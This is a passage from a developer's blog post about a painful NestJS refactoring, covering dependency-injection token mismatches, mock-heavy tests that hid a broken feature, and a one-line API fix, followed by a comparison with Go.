refactoring started innocently enough. Our original notification service was beautifully simple:</p><div><pre><code><span><span>@</span><span>Injectable</span><span>()</span></span> <span><span>class</span><span>NotificationService</span><span> {</span></span> <span><span>constructor</span><span>(</span></span> <span><span> @</span><span>Inject</span><span>(</span><span>'EXTERNAL_API'</span><span>) </span><span>private</span><span>externalApi</span><span>: </span><span>ApiClient</span><span>,</span></span> <span><span>private</span><span>templateEngine</span><span>: </span><span>HandlebarsService</span></span> <span><span> ) {}</span></span> <span><span>async</span><span>sendMessage</span><span>(</span><span>template</span><span>: </span><span>string</span><span>, </span><span>data</span><span>: </span><span>any</span><span>) {</span></span> <span><span>const</span><span>processed</span><span> = </span><span>this</span><span>.</span><span>templateEngine</span><span>.</span><span>process</span><span>(</span><span>template</span><span>, </span><span>data</span><span>);</span></span> <span><span>await</span><span>this</span><span>.</span><span>externalApi</span><span>.</span><span>sendMessage</span><span>({</span></span> <span><span>text:</span><span>processed</span><span>,</span></span> <span><span>blocks:</span><span>this</span><span>.</span><span>buildRichBlocks</span><span>(</span><span>data</span><span>)</span></span> <span><span> });</span></span> <span><span> }</span></span> <span><span>}</span></span></code></pre></div><p>Direct, clear, functional. But according to our enterprise architecture guidelines, it was tightly coupled. The refactored version would route everything through a gateway service:</p><div><pre><code><span><span>@</span><span>Injectable</span><span>()</span></span> <span><span>class</span><span>NotificationService</span><span> {</span></span> <span><span>constructor</span><span>(</span></span> <span><span> @</span><span>Inject</span><span>(</span><span>'GATEWAY_SERVICE'</span><span>) </span><span>private</span><span>gateway</span><span>: </span><span>ClientProxy</span></span> <span><span> ) {}</span></span> <span><span>async</span><span>sendMessage</span><span>(</span><span>messageData</span><span>: </span><span>MessagePayload</span><span>) {</span></span> <span><span>await</span><span>this</span><span>.</span><span>gateway</span><span>.</span><span>emit</span><span>(</span><span>'send_notification'</span><span>, </span><span>messageData</span><span>);</span></span> <span><span> }</span></span> <span><span>}</span></span></code></pre></div><p>Cleaner separation of concerns, centralized external integrations, more testable architecture. What could go wrong?</p><p>Everything.</p><p>When I ran <code>npm test</code>, every single one of our 45 test suites failed. The error message was a masterpiece of unhelpful verbosity:</p><div><pre><code><span><span>UnknownDependenciesException</span><span> [Error]: Nest can</span><span>'t resolve dependencies </span></span> <span><span>of the NotificationService (?, ConfigService, AmqpConnection, </span></span> <span><span>EventSqService, SqService, UserRepository). </span></span> <span><span>Please make sure that the argument "GATEWAY_SERVICE" at index [0] is </span></span> <span><span>available in the NotificationModule context.</span></span> <span><span>Potential solutions:</span></span> <span><span>- Is NotificationModule a valid NestJS module?</span></span> <span><span>- If "GATEWAY_SERVICE" is a provider, is it part of the current NotificationModule?</span></span> <span><span>- If "GATEWAY_SERVICE" is exported from a separate @Module, is that module imported within NotificationModule?</span></span></code></pre></div><p>Here&rsquo;s the fundamental problem: TypeScript cannot verify that the <code>'GATEWAY_SERVICE'</code> token actually exists, that it points to something implementing <code>ClientProxy</code>, or that your test mocks match the real implementation. You get all the ceremony of dependency injection with none of the safety guarantees.</p><p>In plain Node.js, this would be <code>const gateway = require('./gateway')</code>. If the module doesn&rsquo;t exist, you get an immediate error. In NestJS, you need to understand module imports and exports, provider registration, token-based injection, service factory functions, and circular dependency detection. The next three hours were spent in what I call &ldquo;dependency injection archaeology&rdquo;&mdash;digging through layers of module definitions to understand why NestJS couldn&rsquo;t find a service that clearly existed.</p><h3>The Token Naming Catastrophe</h3><p>The investigation revealed the root cause: inconsistent token values across files. Some used one string, others used completely different values:</p><div><pre><code><span><span>// In constants file</span></span> <span><span>export</span><span>const</span><span>GATEWAY_SERVICE</span><span> = </span><span>'GATEWAY_SERVICE'</span><span>;</span></span> <span><span>// But some modules use</span></span> <span><span>export</span><span>const</span><span>GATEWAY_SERVICE</span><span> = </span><span>'RESOURCE_MANAGER_CLIENT'</span><span>;</span></span> <span><span>// And tests use different values entirely</span></span> <span><span>export</span><span>const</span><span>GATEWAY_SERVICE</span><span> = </span><span>'MOCK_GATEWAY_SERVICE'</span><span>;</span></span> <span><span>// With inconsistent usage across files</span></span> <span><span>@</span><span>Inject</span><span>(</span><span>'GATEWAY_SERVICE'</span><span>) </span><span>// Module A</span></span> <span><span>@</span><span>Inject</span><span>(</span><span>'RESOURCE_MANAGER_CLIENT'</span><span>) </span><span>// Module B </span></span> <span><span>@</span><span>Inject</span><span>(</span><span>'MOCK_GATEWAY_SERVICE'</span><span>) </span><span>// Tests</span></span></code></pre></div><p>The real problem was that string-based dependency injection allows these mismatches to compile successfully but fail at runtime. In a language with type-based dependency injection, you&rsquo;d depend on actual interfaces rather than string tokens, eliminating this entire category of lookup errors. It took three hours to standardize token usage across fifteen files just to get dependency injection working again.</p><h3>The Template Processing Archaeology</h3><p>Removing the Handlebars dependency seemed straightforward, just replace <code>Handlebars.compile()</code> with a simple regex:</p><div><pre><code><span><span>// Replace this</span></span> <span><span>const</span><span>template</span><span> = </span><span>Handlebars</span><span>.</span><span>compile</span><span>(</span><span>message</span><span>);</span></span> <span><span>const</span><span>result</span><span> = </span><span>template</span><span>(</span><span>data</span><span>);</span></span> <span><span>// With this </span></span> <span><span>const</span><span>result</span><span> = </span><span>message</span><span>.</span><span>replace</span><span>(</span><span>/</span><span>{{</span><span>(</span><span>w</span><span>+</span><span>)</span><span>}}</span><span>/</span><span>g</span><span>, (</span><span>match</span><span>, </span><span>key</span><span>) </span><span>=&gt;</span><span>data</span><span>[</span><span>key</span><span>]);</span></span></code></pre></div><p>But our codebase had organically evolved multiple incompatible template formats. Some used <code>{{player_name}}</code>, others used <code>&lt;<player>&gt;</player></code>. Some had underscores, others spaces. What started as a simple regex replacement became a complex parsing problem:</p><div><pre><code><span><span>protected</span><span>processTemplates</span><span>(</span><span>text</span><span>: </span><span>string</span><span>, </span><span>data</span><span>: </span><span>any</span><span>): </span><span>string</span><span> {</span></span> <span><span>if</span><span> (!</span><span>text</span><span>) </span><span>return</span><span>text</span><span>;</span></span> <span><span>let</span><span>processed</span><span> = </span><span>text</span><span>;</span></span> <span><span>// Handle URL templates </span></span> <span><span>for</span><span> (</span><span>const</span><span> [</span><span>key</span><span>, </span><span>value</span><span>] </span><span>of</span><span>Object</span><span>.</span><span>entries</span><span>(</span><span>this</span><span>.</span><span>urlMappings</span><span>)) {</span></span> <span><span>const</span><span>placeholder</span><span> = </span><span>key</span><span>.</span><span>replace</span><span>(</span><span>/_/</span><span>g</span><span>, </span><span>' '</span><span>);</span></span> <span><span>const</span><span>regex</span><span> = </span><span>new</span><span>RegExp</span><span>(</span><span>`&lt;&lt;</span><span>${</span><span>placeholder</span><span>}</span><span>&gt;&gt;`</span><span>, </span><span>'gi'</span><span>);</span></span> <span><span>processed</span><span> = </span><span>processed</span><span>.</span><span>replace</span><span>(</span><span>regex</span><span>, </span><span>value</span><span>);</span></span> <span><span> }</span></span> <span><span>// Handle user mentions - but leave these for the gateway</span></span> <span><span>// Don't process &lt;<player>&gt; here</player></span></span> <span><span>return</span><span>processed</span><span>;</span></span> <span><span>}</span></span></code></pre></div><p>This problem reveals how framework complexity can obscure organizational issues. The template format inconsistency was fundamentally a process problem&mdash;lack of code review discipline and no centralized template processing strategy. But the framework&rsquo;s layered abstractions made this duplication harder to spot during development.</p><p>With template processing scattered across multiple services behind dependency injection boundaries, each individual change looked reasonable in isolation. A developer adding <code>&lt;<variable>&gt;</variable></code> syntax in one service wouldn&rsquo;t necessarily see that another service was already using <code>{{variable}}</code> syntax, especially when the processing logic was hidden behind service interfaces.</p><p>If we had used direct string manipulation without framework abstractions, the regex patterns would have been more visible in the codebase. Duplication would have been more obvious during code reviews. The processing logic would have been concentrated in fewer, more discoverable places.</p><p>The framework didn&rsquo;t create the inconsistency, but its complexity provided more places for the inconsistency to hide and grow unnoticed. Four hours of debugging time that could have been prevented with better code review practices, but was made more expensive by architectural complexity.</p><h3>The Constructor Signature Cascade</h3><p>Changing the NotificationService constructor signature broke every test that instantiated it. The mocks weren&rsquo;t just interface changes, they represented fundamentally different interaction patterns:</p><div><pre><code><span><span>// Before - every test file</span></span> <span><span>const</span><span>mockExternalApi</span><span> = {</span></span> <span><span>sendMessage:</span><span>jest</span><span>.</span><span>fn</span><span>(),</span></span> <span><span>getUserInfo:</span><span>jest</span><span>.</span><span>fn</span><span>(),</span></span> <span><span>// ... 20 more methods</span></span> <span><span>};</span></span> <span><span>const</span><span>mockTemplateEngine</span><span> = {</span></span> <span><span>compile:</span><span>jest</span><span>.</span><span>fn</span><span>(),</span></span> <span><span>process:</span><span>jest</span><span>.</span><span>fn</span><span>(),</span></span> <span><span>// ... more methods </span></span> <span><span>};</span></span> <span><span>// After - every test file</span></span> <span><span>const</span><span>mockGateway</span><span> = {</span></span> <span><span>emit:</span><span>jest</span><span>.</span><span>fn</span><span>(),</span></span> <span><span>send:</span><span>jest</span><span>.</span><span>fn</span><span>(),</span></span> <span><span>// Completely different interface</span></span> <span><span>};</span></span></code></pre></div><p>Each of the twelve test files took 45 minutes to update. We went from mocking API clients to mocking message brokers, which required completely different setup patterns. By the end of day one, all tests were passing again, but I did spent nine hours on what should have been a simple refactoring.</p><h2>Day 2: The Mock Testing Catastrophe</h2><p>The testing story reveals the deeper issue with TypeScript safety in NestJS. Comprehensive mocking requires abandoning type safety precisely where you need it most:</p><div><pre><code><span><span>const</span><span>mockGateway</span><span> = {</span></span> <span><span>emit:</span><span>jest</span><span>.</span><span>fn</span><span>(),</span></span> <span><span>send:</span><span>jest</span><span>.</span><span>fn</span><span>(),</span></span> <span><span>// Missing methods? You'll find out at runtime</span></span> <span><span>// Wrong signatures? any defeats checking</span></span> <span><span>} </span><span>as</span><span>any</span><span>; </span><span>// White flag of surrender to type safety</span></span></code></pre></div><p>That <code>as any</code> isn&rsquo;t a bug&mdash;it&rsquo;s the only way to make NestJS mocking work efficiently. You&rsquo;re telling TypeScript &ldquo;I don&rsquo;t care about types&rdquo; in your tests, which defeats the entire purpose of using TypeScript in the first place.</p><p>The elaborate test setup required for NestJS shows how far we&rsquo;ve strayed from simple, verifiable code:</p><div><pre><code><span><span>describe</span><span>(</span><span>'NotificationService'</span><span>, () </span><span>=&gt;</span><span> {</span></span> <span><span>beforeEach</span><span>(</span><span>async</span><span> () </span><span>=&gt;</span><span> {</span></span> <span><span>const</span><span>module</span><span> = </span><span>await</span><span>Test</span><span>.</span><span>createTestingModule</span><span>({</span></span> <span><span>providers:</span><span> [</span></span> <span><span>NotificationService</span><span>,</span></span> <span><span> {</span></span> <span><span>provide:</span><span>'GATEWAY_SERVICE'</span><span>,</span></span> <span><span>useValue:</span><span>mockGateway</span><span>,</span></span> <span><span> },</span></span> <span><span> {</span></span> <span><span>provide:</span><span>ConfigService</span><span>,</span></span> <span><span>useValue:</span><span>mockConfigService</span><span>, </span></span> <span><span> },</span></span> <span><span> {</span></span> <span><span>provide:</span><span>AmqpConnection</span><span>,</span></span> <span><span>useValue:</span><span>mockAmqpConnection</span><span>,</span></span> <span><span> },</span></span> <span><span> {</span></span> <span><span>provide:</span><span>EventSequenceService</span><span>,</span></span> <span><span>useValue:</span><span>mockEventSequenceService</span><span>,</span></span> <span><span> },</span></span> <span><span> {</span></span> <span><span>provide:</span><span>SequenceHandlerService</span><span>, </span></span> <span><span>useValue:</span><span>mockSequenceHandlerService</span><span>,</span></span> <span><span> },</span></span> <span><span> {</span></span> <span><span>provide:</span><span>getRepositoryToken</span><span>(</span><span>PlayerSession</span><span>),</span></span> <span><span>useValue:</span><span>mockRepository</span><span>,</span></span> <span><span> },</span></span> <span><span>// ... 10 more mock services</span></span> <span><span> ],</span></span> <span><span> }).</span><span>compile</span><span>();</span></span> <span><span> });</span></span> <span><span>});</span></span></code></pre></div><p>More time spent setting up mocks than writing actual tests. Mocks drift from real implementations. Complex dependency chains require understanding the entire service graph. Test failures often mean mock setup issues, not actual bugs.</p><p>After fixing all the dependency injection issues and achieving perfect test coverage, I deployed to dev. The tests were green, coverage was high, and the code looked clean. Then we tested the actual feature.</p><p>Expected: Rich interactive message with welcome text and action buttons Actual: Plain text saying &ldquo;Start session 27&rdquo;</p><h2>Day 2: When 93% Coverage Meets 0% Functionality</h2><p>This is the nightmare scenario of modern testing: comprehensive mocks validating that your abstractions work as designed, while your actual feature is completely broken. We had tests verifying that <code>gateway.emit</code> was called with the right parameters, but no tests checking whether messages actually rendered correctly:</p><div><pre><code><span><span>// Test passes</span></span> <span><span>it</span><span>(</span><span>'should send message'</span><span>, </span><span>async</span><span> () </span><span>=&gt;</span><span> {</span></span> <span><span>await</span><span>service</span><span>.</span><span>sendMessage</span><span>(</span><span>mockMessage</span><span>);</span></span> <span><span>expect</span><span>(</span><span>gateway</span><span>.</span><span>emit</span><span>).</span><span>toHaveBeenCalledWith</span><span>(</span><span>'send_notification'</span><span>, </span><span>mockMessage</span><span>);</span></span> <span><span>});</span></span> <span><span>// Real world fails</span></span> <span><span>// External API shows text instead of rich blocks</span></span></code></pre></div><p>The investigation began. Where was the problem? The notification service building messages? The gateway service forwarding them? The external API integration? The external service itself?</p><p>I started tracing through the logs. The notification service was processing notifications correctly:</p><div><pre><code><span><span>{</span></span> <span><span>"level"</span><span>: </span><span>"debug"</span><span>,</span></span> <span><span>"msg"</span><span>: </span><span>"Processing notification"</span><span>,</span></span> <span><span>"payload"</span><span>: {</span></span> <span><span>"template"</span><span>: </span><span>"Welcome to {{scenario_name}}..."</span><span>,</span></span> <span><span>"data"</span><span>: {</span><span>"scenario_name"</span><span>: </span><span>"First Day"</span><span>, </span><span>"player"</span><span>: </span><span>"John"</span><span>}</span></span> <span><span> }</span></span> <span><span>}</span></span></code></pre></div><p>The gateway service was receiving send_notification events with perfect payload structures:</p><div><pre><code><span><span>{</span></span> <span><span>"level"</span><span>: </span><span>"debug"</span><span>, </span></span> <span><span>"msg"</span><span>: </span><span>"Received send_notification event"</span><span>,</span></span> <span><span>"payload"</span><span>: {</span></span> <span><span>"channel"</span><span>: </span><span>"test-channel-123"</span><span>,</span></span> <span><span>"text"</span><span>: </span><span>"Start session 27"</span><span>,</span></span> <span><span>"blocks"</span><span>: [</span></span> <span><span> {</span></span> <span><span>"type"</span><span>: </span><span>"section"</span><span>,</span></span> <span><span>"text"</span><span>: {</span></span> <span><span>"type"</span><span>: </span><span>"mrkdwn"</span><span>,</span></span> <span><span>"text"</span><span>: </span><span>"Welcome to First Day, it is time to meet the team..."</span></span> <span><span> }</span></span> <span><span> },</span></span> <span><span> {</span></span> <span><span>"type"</span><span>: </span><span>"actions"</span><span>, </span></span> <span><span>"elements"</span><span>: [</span></span> <span><span> {</span></span> <span><span>"type"</span><span>: </span><span>"button"</span><span>,</span></span> <span><span>"text"</span><span>: {</span><span>"type"</span><span>: </span><span>"plain_text"</span><span>, </span><span>"text"</span><span>: </span><span>"Start"</span><span>},</span></span> <span><span>"action_id"</span><span>: </span><span>"START_LEVEL"</span></span> <span><span> }</span></span> <span><span> ]</span></span> <span><span> }</span></span> <span><span> ]</span></span> <span><span> }</span></span> <span><span>}</span></span></code></pre></div><p>The external API was receiving the data correctly and responding successfully:</p><div><pre><code><span><span>{</span></span> <span><span>"level"</span><span>: </span><span>"debug"</span><span>,</span></span> <span><span>"msg"</span><span>: </span><span>"Sending message"</span><span>,</span></span> <span><span>"request"</span><span>: {</span></span> <span><span>"channel"</span><span>: </span><span>"test-channel-123"</span><span>, </span></span> <span><span>"text"</span><span>: </span><span>"Start session 27"</span><span>,</span></span> <span><span>"blocks"</span><span>: [</span><span>/* same blocks as above */</span><span>]</span></span> <span><span> },</span></span> <span><span>"response"</span><span>: {</span></span> <span><span>"ok"</span><span>: </span><span>true</span><span>,</span></span> <span><span>"channel"</span><span>: </span><span>"C1234567890"</span><span>, </span></span> <span><span>"ts"</span><span>: </span><span>"1234567890.123456"</span></span> <span><span> }</span></span> <span><span>}</span></span></code></pre></div><p>Every layer was working correctly in isolation, but the end result was wrong. This was maddening. I spent the next six hours investigating whether our template processing was corrupting the JSON, checking character encoding, validating block syntax, and testing message size limits. Everything looked correct.</p><h3>The Framework Wild Goose Chase</h3><p>The framework&rsquo;s abstractions led me down multiple dead ends. Initial theories included:</p><ol> <li>&ldquo;The session service isn&rsquo;t building blocks correctly&rdquo;</li> <li>&ldquo;The gateway service isn&rsquo;t forwarding blocks properly&rdquo;</li> <li>&ldquo;There&rsquo;s a serialization issue between services&rdquo;</li> <li>&ldquo;The template processing is corrupting the JSON structure&rdquo;</li> </ol><p>I spent hours debugging the wrong layers entirely, tracing through framework internals instead of questioning external assumptions. The sophistication of the abstractions made it feel like the problem must be in our code, not in something as simple as API field precedence.</p><h2>Day 3: The One-Line Revelation</h2><p>Starting day three, I decided to stop assuming the problem was in our code and start questioning external assumptions. Maybe the external API was working correctly, and the problem was in how it prioritizes different message fields.</p><p>I dove deep into the external API documentation and found this buried section:</p><blockquote><p><strong>The text, blocks and attachments fields</strong></p><p>The usage of the text field changes depending on whether you&rsquo;re using blocks. If you&rsquo;re using blocks, this is used as a fallback string to display in notifications. If you aren&rsquo;t, this is the main body text of the message.</p><p><strong>When both text and blocks are present, the text field takes precedence as the main message content.</strong></p></blockquote><p>There it was. The smoking gun. The reason 24 hours of debugging had yielded nothing.</p><p>When both <code>text</code> and <code>blocks</code> fields are present, the external API uses <code>text</code> as the primary content and treats <code>blocks</code> as secondary. We were sending both fields, so the API was showing our fallback text instead of our rich blocks.</p><p>The fix was embarrassingly simple:</p><div><pre><code><span><span>// Before (broken)</span></span> <span><span>const message = {</span></span> <span><span>channel</span><span>: </span><span>data.channel</span><span>,</span></span> <span><span>text</span><span>: </span><span>processedText</span><span>, </span><span>// API prioritizes this</span></span> <span><span>blocks</span><span>: </span><span>richBlocks</span><span>// Over this</span></span> <span><span>};</span></span> <span><span>// After (working)</span></span> <span><span>const messageText = data.blocks ? '' : processedText;</span></span> <span><span>const message = {</span></span> <span><span>channel</span><span>: </span><span>data.channel</span><span>, </span></span> <span><span>text</span><span>: </span><span>messageText</span><span>, </span><span>// Empty when blocks present</span></span> <span><span>blocks</span><span>: </span><span>richBlocks</span></span> <span><span>};</span></span></code></pre></div><p>One line of logic. After 24+ hours of debugging across multiple services, extensive logging, JSON corruption theories, template processing investigations, and dependency injection archaeology.</p><h3>The Testing Aftermath</h3><p>Of course, the one-line fix broke several existing tests that expected different behavior:</p><div><pre><code><span><span>// This test was now wrong</span></span> <span><span>expect(apiClient.sendMessage).toHaveBeenCalledWith({</span></span> <span><span>text</span><span>: </span><span>'Expected</span><span>text'</span><span>, </span><span>// Now expects empty string</span></span> <span><span>blocks</span><span>: </span><span>expectedBlocks</span></span> <span><span>});</span></span> <span><span>// Had to become this</span></span> <span><span>expect(apiClient.sendMessage).toHaveBeenCalledWith({</span></span> <span><span>text</span><span>: </span><span>''</span><span>, </span><span>// Empty when blocks present</span></span> <span><span>blocks</span><span>: </span><span>expectedBlocks</span></span> <span><span>});</span></span></code></pre></div><p>Required updating four test files and adding three new test cases to cover the text/blocks interaction logic. Two more hours updating tests for a one-line code change.</p><h2>The Fundamental Type Safety Problem</h2><p>This experience crystallized a fundamental insight about TypeScript and dependency injection frameworks. Compare the debugging experience to what the same refactoring might look like in Go:</p><div><pre><code><span><span>type</span><span>NotificationService</span><span>struct</span><span> {</span></span> <span><span> gateway GatewayClient </span><span>// Interface verified at compile time</span></span> <span><span>}</span></span> <span><span>func</span><span>NewNotificationService</span><span>(gateway GatewayClient) *NotificationService {</span></span> <span><span>return</span><span> &amp;NotificationService{gateway: gateway}</span></span> <span><span>}</span></span> <span><span>func</span><span> (s *NotificationService) </span><span>SendMessage</span><span>(msg MessagePayload) </span><span>error</span><span> {</span></span> <span><span>return</span><span> s.gateway.</span><span>Send</span><span>(</span><span>"send_notification"</span><span>, msg)</span></span> <span><span>}</span></span></code></pre></div><p>If <code>gateway</code> doesn&rsquo;t implement <code>GatewayClient</code>, the code won&rsquo;t compile. No tokens, no runtime injection failures, no module archaeology. The dependencies are explicit in the constructor signature.</p><p>Testing becomes straightforward:</p><div><pre><code><span><span>type</span><span>MockGateway</span><span>struct</span><span> {</span></span> <span><span> LastEvent </span><span>string</span></span> <span><span> LastPayload MessagePayload</span></span> <span><span>}</span></span> <span><span>func</span><span> (m *MockGateway) </span><span>Send</span><span>(event </span><span>string</span><span>, payload MessagePayload) </span><span>error</span><span> {</span></span> <span><span>m.LastEvent</span><span> = event</span></span> <span><span>m.LastPayload</span><span> = payload</span></span> <span><span>return</span><span>nil</span></span> <span><span>}</span></span> <span><span>func</span><span>TestSendMessage</span><span>(t *testing.T) {</span></span> <span><span>mockGateway</span><span> := &amp;MockGateway{}</span></span> <span><span>service</span><span> := </span><span>NewNotificationService</span><span>(mockGateway)</span></span> <span><span>err</span><span> := service.</span><span>SendMessage</span><span>(testMessage)</span></span> <span><span> assert.</span><span>NoError</span><span>(t, err)</span></span> <span><span> assert.</span><span>Equal</span><span>(t, </span><span>"send_notification"</span><span>, mockGateway.LastEvent)</span></span> <span><span> assert.</span><span>Equal</span><span>(t, testMessage, mockGateway.LastPayload)</span></span> <span><span>}</span></span></code></pre></div><p>If <code>MockGateway</code> doesn&rsquo;t correctly implement <code>GatewayClient</code>, it won&rsquo;t compile. The compiler enforces that mocks match interfaces without escape hatches. No <code>as any</code>, no token mismatches, no runtime surprises.</p><h2>Where TypeScript&rsquo;s Promise Breaks Down</h2><p>TypeScript promises type safety, but NestJS patterns systematically undermine it:</p><ul> <li><code>@Inject()</code> tokens bypass type checking entirely</li> <li><code>any</code> types in test mocks disable verification where it matters most</li> <li>Reflection-based decorators hide runtime behavior from static analysis</li> <li>Module resolution happens at runtime, not compile time</li> <li>Complex dependency graphs obscure simple integration failures</li> </ul><p>You end up with TypeScript&rsquo;s complexity overhead without its safety benefits. The type system becomes theater, present for developer confidence but absent when you actually need protection.</p><h3>The Architecture Mismatch</h3><p>The deeper issue was architectural: we chose enterprise patterns before we had enterprise problems. A 6-person team building a straightforward notification service doesn&rsquo;t need sophisticated dependency injection, modular architecture, or decorator-driven development.</p><p>We optimized for coordination problems we didn&rsquo;t have while creating debugging problems we did have. The &ldquo;enterprise ready&rdquo; patterns became obstacles to shipping working software.</p><p>The refactoring story reveals the hidden costs of sophisticated frameworks:</p><ul> <li><strong>Development Time:</strong> 3 days instead of planned 1 day</li> <li><strong>Debugging Time:</strong> 24+ hours for a one-line fix</li> <li><strong>Test Maintenance:</strong> Updates across 16 test files</li> <li><strong>System Complexity:</strong> Simple direct calls became multi-service orchestration</li> <li><strong>Knowledge Requirements:</strong> Team needs to understand dependency injection, module systems, message patterns, cross-service debugging</li> </ul> <h2>The Backend Development Reality Check</h2><p>Backend services have specific requirements that expose these weaknesses:</p><p><strong>Runtime Failures Are Expensive:</strong> A dependency injection failure can bring down production services. Compile-time verification prevents entire categories of deployment issues that no amount of testing can catch reliably.</p><p><strong>Debugging at 3 AM:</strong> When services fail in production, you need stack traces pointing to actual code, not framework internals. Six developers tracing through dependency injection chains is waste.</p><p><strong>Performance Under Load:</strong> Reflection overhead and dynamic resolution costs accumulate in high-throughput services. Direct function calls have predictable performance characteristics.</p><p><strong>Team Coordination:</strong> The complexity should be in business logic, not in framework mechanics. Understanding your domain is hard enough without also needing to understand framework archaeology.</p><h2>The Language Choice Implications</h2><p>This experience revealed a fundamental tension in backend development: flexibility versus safety. JavaScript and TypeScript optimize for rapid prototyping and developer expressiveness. Strictly typed languages optimize for correctness and long-term maintenance.</p><p>For backend services where bugs have real business impact, correctness often matters more than expressiveness. The ability to ship fast doesn&rsquo;t matter if what you ship doesn&rsquo;t work reliably.</p><p>Go&rsquo;s approach&mdash;explicit dependencies, compile-time verification, simple patterns&mdash;aligns better with backend development requirements. You sacrifice some expressiveness for much stronger guarantees about correctness.</p><p>Consider how the same service structure looks in Go:</p><div><pre><code><span><span>type</span><span>NotificationService</span><span>struct</span><span> {</span></span> <span><span> httpClient *http.Client</span></span> <span><span> config *Config</span></span> <span><span> logger *slog.Logger</span></span> <span><span>}</span></span> <span><span>func</span><span> (s *NotificationService) </span><span>SendMessage</span><span>(ctx context.Context, msg Message) </span><span>error</span><span> {</span></span> <span><span>payload</span><span>, </span><span>err</span><span> := json.</span><span>Marshal</span><span>(msg)</span></span> <span><span>if</span><span> err != </span><span>nil</span><span> {</span></span> <span><span>return</span><span> fmt.</span><span>Errorf</span><span>(</span><span>"failed to marshal message: </span><span>%w</span><span>"</span><span>, err)</span></span> <span><span> }</span></span> <span><span>req</span><span>, </span><span>err</span><span> := http.</span><span>NewRequestWithContext</span><span>(ctx, </span><span>"POST"</span><span>, s.config.GatewayURL, bytes.</span><span>NewReader</span><span>(payload))</span></span> <span><span>if</span><span> err != </span><span>nil</span><span> {</span></span> <span><span>return</span><span> fmt.</span><span>Errorf</span><span>(</span><span>"failed to create request: </span><span>%w</span><span>"</span><span>, err)</span></span> <span><span> }</span></span> <span><span>resp</span><span>, </span><span>err</span><span> := s.httpClient.</span><span>Do</span><span>(req)</span></span> <span><span>if</span><span> err != </span><span>nil</span><span> {</span></span> <span><span>return</span><span> fmt.</span><span>Errorf</span><span>(</span><span>"failed to send request: </span><span>%w</span><span>"</span><span>, err)</span></span> <span><span> }</span></span> <span><span>defer</span><span> resp.Body.</span><span>Close</span><span>()</span></span> <span><span>if</span><span> resp.StatusCode != http.StatusOK {</span></span> <span><span>return</span><span> fmt.</span><span>Errorf</span><span>(</span><span>"gateway returned error: </span><span>%d</span><span>"</span><span>, resp.StatusCode)</span></span> <span><span> }</span></span> <span><span>return</span><span>nil</span></span> <span><span>}</span></span></code></pre></div><p>No dependency injection framework. No complex module system. No token-based provider registration. No extensive mock configurations. Stack traces point to actual code. External API behavior is immediately obvious. Dependencies are explicit and compile-time verified.</p><p>Testing requires no framework magic:</p><div><pre><code><span><span>func</span><span>TestNotificationService_SendMessage</span><span>(t *testing.T) {</span></span> <span><span>server</span><span> := httptest.</span><span>NewServer</span><span>(http.</span><span>HandlerFunc</span><span>(</span><span>func</span><span>(w http.ResponseWriter, r *http.Request) {</span></span> <span><span> assert.</span><span>Equal</span><span>(t, </span><span>"POST"</span><span>, r.Method)</span></span> <span><span> assert.</span><span>Equal</span><span>(t, </span><span>"application/json"</span><span>, r.Header.</span><span>Get</span><span>(</span><span>"Content-Type"</span><span>))</span></span> <span><span>var</span><span>msg</span><span> Message</span></span> <span><span>err</span><span> := json.</span><span>NewDecoder</span><span>(r.Body).</span><span>Decode</span><span>(&amp;msg)</span></span> <span><span> assert.</span><span>NoError</span><span>(t, err)</span></span> <span><span> assert.</span><span>Equal</span><span>(t, </span><span>"test message"</span><span>, msg.Text)</span></span> <span><span> w.</span><span>WriteHeader</span><span>(http.StatusOK)</span></span> <span><span> }))</span></span> <span><span>defer</span><span> server.</span><span>Close</span><span>()</span></span> <span><span>config</span><span> := &amp;Config{GatewayURL: server.URL}</span></span> <span><span>service</span><span> := &amp;NotificationService{</span></span> <span><span> httpClient: http.DefaultClient,</span></span> <span><span> config: config,</span></span> <span><span> logger: slog.</span><span>Default</span><span>(),</span></span> <span><span> }</span></span> <span><span>err</span><span> := service.</span><span>SendMessage</span><span>(context.</span><span>Background</span><span>(), Message{Text: </span><span>"test message"</span><span>})</span></span> <span><span> assert.</span><span>NoError</span><span>(t, err)</span></span> <span><span>}</span></span></code></pre></div><p>No mocks needed&mdash;just spin up a test server and verify the actual HTTP behavior. The test validates that the service correctly constructs requests and handles responses, not that it calls mocked methods with expected parameters.</p><h2>The Hidden Costs of Sophisticated Frameworks</h2><p>NestJS provides genuine value for large teams building complex systems. The modular architecture, built-in patterns, and comprehensive ecosystem solve real coordination problems. But that value comes with costs that aren&rsquo;t obvious until you pay them:</p><p><strong>Cognitive Overhead:</strong> Understanding framework mechanics instead of business logic. Every team member needs to understand dependency injection, module systems, decorator patterns, and testing frameworks.</p><p><strong>Debugging Complexity:</strong> Multiple abstraction layers obscuring simple problems. When something breaks, you debug through framework internals instead of your actual code.</p><p><strong>Testing Theater:</strong> High coverage masking low effectiveness. Extensive mocking validates that your abstractions work as designed, not that your business logic produces correct outcomes.</p><p><strong>Runtime Surprises:</strong> Type system failures in production. Token mismatches, circular dependencies, and configuration errors that compile successfully but fail at runtime.</p><p>For teams building straightforward services, these costs often exceed the benefits. The framework optimizes for problems you don&rsquo;t have while creating problems you can&rsquo;t solve efficiently.</p><h2>When Enterprise Patterns Actually Pay Off</h2><p>The refactoring was ultimately successful despite the pain. The new architecture is more maintainable, more testable, and better separated. The centralized gateway service makes it easier to add new external integrations and handle failures consistently.</p><p>But this only pays off because we&rsquo;re building a system with multiple external integrations, team coordination requirements, and long-term maintenance needs. The complexity tax becomes worthwhile when the problems justify the tools.</p><p>NestJS makes sense when you have:</p><ul> <li><strong>Large teams (15+ developers)</strong> needing enforced consistency across multiple services</li> <li><strong>Complex domains</strong> requiring extensive validation, authorization, and business rule coordination</li> <li><strong>Long-term maintenance</strong> where modular architecture benefits outweigh development velocity costs</li> <li><strong>Enterprise requirements</strong> for observability, compliance, and operational consistency</li> </ul><p>Simpler approaches make sense when you have:</p><ul> <li><strong>Small teams (2-10 developers)</strong> prioritizing rapid iteration and fast feedback loops</li> <li><strong>Straightforward domains</strong> where business logic complexity doesn&rsquo;t require framework abstractions</li> <li><strong>Performance requirements</strong> where framework overhead impacts user experience</li> <li><strong>Experienced developers</strong> who can maintain consistency without framework enforcement</li> </ul> <h2>The Architectural Choice Framework</h2><p>The key insight from this experience is that architectural decisions should optimize for current requirements while remaining flexible enough to evolve, not for hypothetical future problems that may never materialize.</p><p>Instead of asking &ldquo;What&rsquo;s the most sophisticated solution?&rdquo; or &ldquo;What would Netflix use?&rdquo;, ask:</p><ol> <li><strong>What problems do we actually have today?</strong> &ndash; Don&rsquo;t solve coordination problems you 